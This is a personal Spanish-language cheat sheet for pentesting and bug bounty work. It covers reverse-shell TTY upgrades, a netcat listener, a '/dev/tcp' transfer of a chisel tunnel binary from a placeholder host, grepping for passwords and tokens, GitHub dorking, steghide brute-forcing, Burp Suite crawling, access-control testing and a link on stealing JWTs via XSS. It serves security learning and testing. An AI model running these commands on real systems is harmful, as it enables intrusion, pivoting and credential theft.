# Varias cositas  

## Comandos y funciones Bash utiles  

extractPorts  
https://gist.github.com/anibalardid/5e05b6472feb3d31116729dc24e6d3e2  

rmk  
https://gist.github.com/anibalardid/b2d4025152d913e398fcef6830d89cad  

mkt  
https://gist.github.com/anibalardid/6bbd0a8fefb507b88bc511d41ecd91ba  


## Diccionarios  

https://github.com/NullWin/DiccionarioArgentino  


## Tips  

### Comandos al ingresar por shell (reverse shell)  

whoami  
ifconfig o ip a  
  
script /dev/null -c bash  
^Z  
stty raw echo -echo; fg  
nc -nlvp 443  
reset  

terminal ? xterm  
export TERM=xterm  
export SHELL=bash  

en una ventana mia ejecutar: stty -a   
Y ver la cantidad de filas y columnas, para configurar lo mismo en la maquina remota  
stty rows 53 columns 206  

Buscamos credenciales  
grep -r -i -E "user|pass|key|token"  

Buscamos archivos   
find \-type f 2>/dev/null  

Script en python:  
https://pastebin.com/5GqY54FG  

### Chisel  
https://github.com/jpillora/chisel  

truco para compilar a bajo peso:  
go build -ldflags "-s -w"  
du -hc chisel  
upx brute chisel  
du -hc chisel  

> upx comprime binarios

desde maquina local hacer:  
nc -lnvp 443 < chisel  
y en maquina virtual:  
cat > chisel < /dev/tcp/ipxxx/443

maquina local:  
./chisel server --reverse -p puerto    

maquina ataque:  
./chisel client ip:puerto  

### Borrado seguro de archivos  
scrub y shred  

### TMUX  
Oh My TMUX  
https://github.com/gpakosz/.tmux  

Cheat Sheet  
https://gist.github.com/anibalardid/d5db8be18cabafe9fc8eea28c3fae2f7  


### Steghide - Esteganografía  
Buscar contenido en las imágenes  

http://steghide.sourceforge.net/  
https://fwhibbit.es/steghide-brute-force-tool  
https://github.com/Va5c0/Steghide-Brute-Force-Tool  
https://github.com/Paradoxis/StegCracker  


### Encodear (encoding) de payloads para pruebas  
CyberChef  
https://gchq.github.io/CyberChef/  

### Buscar directorios y subdominios con Burp Suite Pro
Extensiones interesantes a instalar en Burp Suite:  
```
XSS Validator
Software Vulnerability Scanner
Replicator
NoSQLi Scanner
JavaScript Security
Flow
Error Message Checks
CSRF Scanner
CMS Scanner
Burp Bounty
Autowasp
```

1- Abrir proxy y cargar sitio  
2- Ir a Target - Scope -> cambiar a modo avanzado y escribir solo una parte de la url, por ejemplo "hilton" , y luego poner NO  
3- Ir a Sitemap, tocar en la barra de Filter, y tildar "show only in scope items"  
4- Señalar todos los dominios, boton derecho, Scan  
5- Elegir opcion "Crawl", luego en SCAN CONFIGURATION -> select from library , agregar "crawl strategy faster" y "never stop..."  
6- En Resource pool, poner un maximo de request , por ej 50, que grabe , y darle a OK   
7- En Dashboard se puede ver el progreso de escaneo.  
8- En la solapa Flow tambien se puede ver el progreso, si no se tiene se instala de Extended -> BApp Store  


### Pasos The Bug Hunter's Methodology Full 2-hour Training by Jason Haddix  

- Búsqueda subdominios
amass, subfinder  

- Github Dorks
GitDorker: 
https://obheda12.medium.com/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5  
https://github.com/obheda12/GitDorker  
Hunter.sh:  
https://gist.github.com/anibalardid/9787094b9c642eadd217c7b6dd6dbfac  
  
Github Search :  
https://github.com/gwen001/github-search  

- Verificar subdominios  y dominios activos
httprobe:  
https://github.com/tomnomnom/httprobe  




#### Checklist Methodology
https://gist.github.com/jhaddix/6b777fb004768b388fefadf9175982ab#file-wahh_task_checklist-md  


--- 

### Broken Access Control
Tips de El Mago

ejemplo de writeup    
https://galnagli.com/Samsung_Exposure/  
https://notifybugme.medium.com/unauthorized-access-to-admin-setpassword-page-by-bypass-403-forbidden-f10bbb92ab35  

### Tips  
crear 2 cuentas , comun y otra para admin (usando + o . , o mails temporales)  
usar match and replace de burp suite  
reemplazar false x true y true x false  (proxy, options, match and replace, como response body)  
leer los archivos js  
probar cambiar verbo/metodos  

Extension multi account container  

se le puede dar acceso a la cuenta desde un usuario a otro  
y vemos q hay opciones q no se ven  
en el burp, en proxy history, boton derecho - repeater  
hacemos lo mismo con un request del otro usuario   
probamos cambiar los authorization headers entre los requests  
e ir probando 1 x 1 varios endpoints  

Se puede automatizar, instalando desde BApp Store  : Authorize   

robar x xss sesion de jwt de localstorage   
https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0   


### Encode 
Para usar xss, se puede encodear el código como unicode. 


## Como usar Burp Suite

### Configuración inicial
1) Instalar en el browser Foxy Proxy (o configurar a mano el proxy)
2) La config del proxy se encuentra en Proxy - Options 
3) Exportar el archivo del certificado .der
4) Importar certificado en el browser, en la sección de entidades , debe preguntar opciones al importar
5) Probar encender el proxy y cargar una web https para probar q funcione el certificado
6) En Burp en Proxy - Intercept , si esta en ON, podremos ir viendo los requests y responses, avanzando con el boton de Forward

### Uso Básico
1) Encender proxy
2) Poner Intercept en Off , hasta que querramos empezar a interceptar
3) Ir a la solapa TARGET y en Scope especificar la url, o con la opcion Avanzada elegir un regex
4) Luego en Proxy, ir a Opciones, y ahi poner AND en las opciones de Intercept Client Request
5) 



